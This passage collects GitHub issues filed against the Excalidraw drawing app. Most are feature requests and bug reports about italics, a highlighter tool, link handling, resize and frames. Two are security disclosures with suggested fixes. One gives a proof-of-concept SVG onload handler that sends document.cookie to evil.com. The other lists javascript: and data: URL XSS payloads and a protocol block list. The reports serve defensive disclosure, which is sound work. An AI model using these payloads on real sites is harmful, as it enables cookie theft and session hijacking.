- **Session Hijacking**: Access to cookies, localStorage, and session data
- **Data Exfiltration**: Ability to read and send sensitive data (drawings, files, encryption keys)
- **Collaboration Takeover**: Control of collaborative sessions

## Proof of Concept (Theoretical)

A maliciously crafted QR code library could generate:
```svg
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil.com?c='+encodeURIComponent(document.cookie))">
  ...
</svg>
```

This would be rendered and the `onload` handler would execute.

## Affected Users

All users who use the shareable link feature to create and display QR codes for collaboration links.

## Severity

**HIGH** - Allows XSS with user interaction required (user scans/shares QR code)

## Suggested Fix

1. **Add SVG Sanitization**: Use DOMPurify or a similar sanitizer before rendering:
```tsx
import DOMPurify from 'dompurify';

return (
  <div
    className="ShareDialog__active__qrcode"
    dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(svgData, { USE_PROFILES: { svg: true, svgFilters: true } }) }}
  />
);
```

2. **Validate SVG Structure**: Ensure only allowed SVG elements and attributes are present:
   - Allow: `svg`, `path`, `rect`, `circle`, `polygon`, `line`
   - Block: `script`, all event handlers (`onload`, `onerror`, etc.)

3. **Alternative Rendering**: Consider rendering the QR code using a Canvas element or a dedicated React component instead of raw HTML.

4. **Audit QR Code Library**: Review `./qrcode.chunk` implementation for potential vulnerabilities.

## Credits

Found during automated security review.

## Related Issues

None known.
author: sulthonzh

title: Security: Avatar URLs Not Sanitized Before Rendering
body: ## Summary Collaborator avatar URLs are rendered directly in `` tags without URL validation or sanitization. If avatar URLs can be manipulated by users, this creates XSS and security vulnerabilities. ## Location Files: `packages/excalidraw/actions/actionNavigate.tsx:105, 133` ## Vulnerability Details ```tsx ``` The `avatarUrl` is used directly without any validation. While in a typical implementation avatar URLs might come from trusted sources, there are scenarios where this could be user-controlled: 1. **Collaboration Feature**: Users can invite others to collaborate; avatar URLs could come from user input 2. **Room Creation**: When creating a collaboration room, users might provide their own avatar 3. **Import/Export**: If collaboration state can be exported and imported, avatar URLs could be manipulated ## Attack Vectors If avatar URLs are user-controllable, an attacker could set: - `javascript:alert('XSS')` → XSS (some browsers block this, but not all) - `data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=` → XSS via SVG - `data:text/html,` → XSS - Tracking pixels or Web bugs → Privacy violation ## Impact - **XSS**: If avatar URLs are user-controlled and `javascript:` or `data:` URLs are allowed - **Privacy Violations**: Tracking via malicious URLs - **CSRF**: If avatar URLs can set cookies - **Phishing**: Displaying fake avatars from malicious domains ## Severity **MEDIUM** - Requires user control over avatar URLs to be exploitable ## Suggested Fix 1. **URL Protocol Whitelist**: ```tsx function isValidAvatarUrl(url: string): boolean { if (!url) return false; try { const parsed = new URL(url); return ['https:', 'http:'].includes(parsed.protocol); } catch { return false; } } ``` 2. **Block Dangerous Protocols**: ```tsx function sanitizeAvatarUrl(url: string): string { const lowerUrl = url.toLowerCase(); if (lowerUrl.startsWith('javascript:') || lowerUrl.startsWith('data:') || lowerUrl.startsWith('vbscript:') || lowerUrl.startsWith('about:')) { return DEFAULT_AVATAR; } return url; } ``` 3. **Use a Proxy Service**: Route external avatar URLs through a trusted proxy that validates and sanitizes 4. **Default Fallback**: Always provide a default avatar for invalid URLs ## Credits Found during automated security review. ## Related Issues #11385, #11386

title: Add support for italic text
body:
Hi Excalidraw Team,

I’m Arthur. Thank you for building such a great drawing tool.

I would like to suggest adding support for italic text in Excalidraw. Currently, users can choose different fonts when editing text, but there does not seem to be a direct way to make text italic.

This would be very useful for creating academic figures, flowcharts, formula explanations, or emphasizing specific keywords.

It would be great if Excalidraw could support one of the following options:

Add an Italic option to the text style panel
Support shortcuts such as Ctrl + I / Cmd + I
Provide a font style that supports italic text

This feature would make text formatting more flexible and improve the experience for academic and technical diagrams.

Thanks again for your great work!

Arthur
author: pidanoyes

title: Support OAuth or query parameter for Excalidraw+ MCP access
body:
# Summary
Today, most web- or desktop-based clients do not allow to add MCP servers with `Baerer` token authentication. They rely on best practices and require OAuth authentication (https://modelcontextprotocol.io/docs/tutorials/security/authorization)

# Feature Request
Do you mind providing one of these alternatives?
1. An OAuth-based authentication mechanism according to MCPs best practices
2. A query parameter like `https://api.excalidraw.com/api/v1/mcp?token=my-secret-token`

`#1` is definitely more future-oriented, but it faces greater challenges in implementation. Where as `#2` is rather simple to implement, but might have some limitations depending on the client used.

title: Feature Request: Dedicated Highlighter / Marker Tool for Annotations and Note-Taking
body:
## Problem

Excalidraw currently provides drawing, pen, shapes, and text tools, but there is no dedicated highlighter/marker tool for emphasizing existing content.

When taking notes, creating diagrams, reviewing designs, or presenting information, users often need to highlight specific text, shapes, or regions without completely covering the underlying content.

## Proposed Solution

Add a dedicated **Highlighter (Marker) Tool** that behaves similarly to a real-world fluorescent marker.

### Suggested Behavior

* Semi-transparent stroke color.
* Works on top of text, shapes, arrows, images, and freehand drawings.
* Adjustable opacity.
* Adjustable marker width.
* Multiple highlight colors (yellow, green, pink, blue, etc.).
* Maintains visibility of underlying content.
* Supports layering and selection like other Excalidraw elements.

## Use Cases

### Note Taking

Highlight important sections of diagrams, flowcharts, and annotations.

### Design Reviews

Emphasize areas that require attention or changes.

### Teaching & Presentations

Visually guide viewers to key parts of a drawing.

### Collaborative Work

Mark important sections without altering original content.

## Benefits

* Improves note-taking workflows.
* Makes presentations and explanations clearer.
* Reduces the need to simulate highlighting using semi-transparent rectangles.
* Provides a more natural and familiar annotation experience.

## Additional Consideration

If implementing a separate tool is not preferred, a "marker mode" for the existing freehand drawing tool could also achieve this functionality by automatically applying transparency and blending.

Thanks for considering this feature.

title: [Bug / Regression] "Open link" from context menu opens in the active tab instead of a new tab
body:
### Describe the Bug
A regression has been introduced in recent versions regarding how links are handled via the element context menu. Previously, right-clicking an element containing a link (internal or external) and selecting **"Open link"** would instantiate the content in a new workspace leaf (new tab). Currently, it overrides the active leaf, opening the link in the same tab and disrupting the user's navigation flow and flowchart state.

### Steps to Reproduce
1. Open an Excalidraw drawing within Obsidian.
2. Create any shape/element and embed a link (either an internal markdown note `[[Note]]` or an external URL).
3. Right-click the element to invoke the context menu.
4. Click on **"Open link"**.

### Expected Behavior
The target link should open in a new tab, preserving the active Excalidraw canvas view, as per legacy behavior. 

### Actual Behavior
The link opens directly in the active tab, replacing the current Excalidraw view. The user has to manually navigate back to restore the canvas context.

### Proposed Solution / Technical Insight
If this behavior was modified intentionally to align with specific upstream Obsidian API guidelines (e.g., default `openLinkText` handling), please consider exposing a toggle configuration in the plugin settings, such as:
- `[ ] Open context menu links in a new tab by default`

This would restore backward compatibility for users who utilize Excalidraw as a central dashboard/flowchart for knowledge management.

### Environment
- **Obsidian Version:1.12.7** - **Excalidraw Plugin Version: 2.23.8** - **OS: Windows 11**

author: ccw-morris

title: [Bug] Alt resize changes positioning on vertical transforms
body:
https://github.com/user-attachments/assets/371f801e-fbac-4440-99b3-514aaad9302a

### Steps to Replicate
1. Create a container with multi-line bound text
2. Hold down alt key, while applying a transform on either `n` or `s` handle.
3. Try to shrink the container, past its min height (height of bound text)
4. Notice the vertical shift of position

I believe the expected behavior is that when center resize is applied to a container with multi-line bound text, it should maintain its current constraining anchor at the center instead of applying a vertical shift once the minimum height constraint is reached.

### Root Cause
The root could be found in the function [`handleBindTextResize`](https://github.com/excalidraw/excalidraw/blob/a83ac488536dbf4bc4dcf1f472f72ce3b4bd2073/packages/element/src/textElement.ts#L192-L204), where it currently doesn't take into account center resizing when updating the y position of the container.

### Proposed Approach
My approach will be to add `shouldResizeFromCenter` as a parameter with a default value of `false` in `handleBindTextResize` 

The value would then be passed from:
- [`resizeSingleElement`](https://github.com/excalidraw/excalidraw/blob/a83ac488536dbf4bc4dcf1f472f72ce3b4bd2073/packages/element/src/resizeElements.ts#L722-L734)

- [`resizeMultipleElements`](https://github.com/excalidraw/excalidraw/blob/a83ac488536dbf4bc4dcf1f472f72ce3b4bd2073/packages/element/src/resizeElements.ts#L1149-L1157)

Where `shouldResizeFromCenter` would be taken into account for determining the `updatedY` position. 

Since the parameter defaults to `false`, this should not disrupt other callers of `handleBindTextResize` that rely on its existing behavior.
author: cTangonan123

title: [Proposal] Add Vitest Contributor Guide for Testing and Coverage Workflow
body:
## Summary
Since the project transition to Vitest for global coverage reporting (integrated in PR #10905 ), there is a gap in documentation for contributors on how to execute these workflows locally.

## The Problem
Currently, new contributor lack a single source of truth for local testing. In a monorepo environment, this leads to confusion regarding:
- Which directory to run commands from (root vs. specific packages)
- Which scripts to use (yarn test, yarn test:all, etc.).
- How to generate and interpret local coverage reports before pushing to CI.

This result in "CI noise"—maintainers and contributors wasting time on failed GitHub Action runs that could have been caught locally in seconds.

## Proposed Implementation Plan
I propose adding a structured guide (either in docs/ or a new TESTING.md) covering:
- Command Standardization: Clear instructions for running tests at the package level vs. repo level.
- Filtered Testing: Guidance on using Vitest filters to run specific test files for faster feedback loops.
- Coverage Reporting: Instructions on how to use the --coverage flags to match CI results.
- Troubleshooting: Solutions for common environment hurdles (e.g., JSDOM setup, Node version compatibility).

## Current Progress
I have already prepared a draft (PR #11255 ) that implements this documentation based on a testing patterns establish during the throttleRAF migration. I would appreciate your feedback on whether this implementation plan aligns with the projects long-term goals.

title: BUG: Moving content from one frame to another directly is bugged
body: > I reported this bug in the excalidraw obsidian plugin repo so you can read a full write-up here: > https://github.com/zsviczian/obsidian-excalidraw-plugin/issues/2799 > > I already created this PR that at least fixes it: https://github.com/excalidraw/excalidraw/pull/11486 ### Describe the bug When you move an entity from one frame directly into another the entity frameID remains the previous one: - So the element can no longer be clicked (due to clipped outside the bounds of the frame) etc - So in order to move the entity to the new frame you have to e.g. first move outside and then move into the new ### Findings I think this is the commit that introduced it: https://github.com/excalidraw/excalidraw/commit/d2557474e2a9cfccd0a94ab950a2e763ab12823a I originally checked the diff inside the obsidian package version so: > Checking the diff between those versions... I think this is the commit that introduced it as it touches some sensitive lines in frame.ts > https://github.com/dimateos/obsidian-excalidraw-pkg/commit/6d379b6761db874b4e8ca97c1cc4c99edf95cae6#diff-5ec24e95740a4407a93c6770cff2c0673311c3466f9d7cdde7aee72789d9ff06 > > I think the culprit is this if line > https://github.com/dimateos/obsidian-excalidraw-pkg/blob/6d379b6761db874b4e8ca97c1cc4c99edf95cae6/packages/element/src/frame.ts#L580 > > This merge comes from excalidraw aaand yep this behavior can ALSO be reproduced currently in excalidraw website > https://excalidraw.com/ ### Expected behavior This is clearly a regression, not intended, the new frame bounds are even highlighted but then when you drop the entity it still remains in the previous frame.
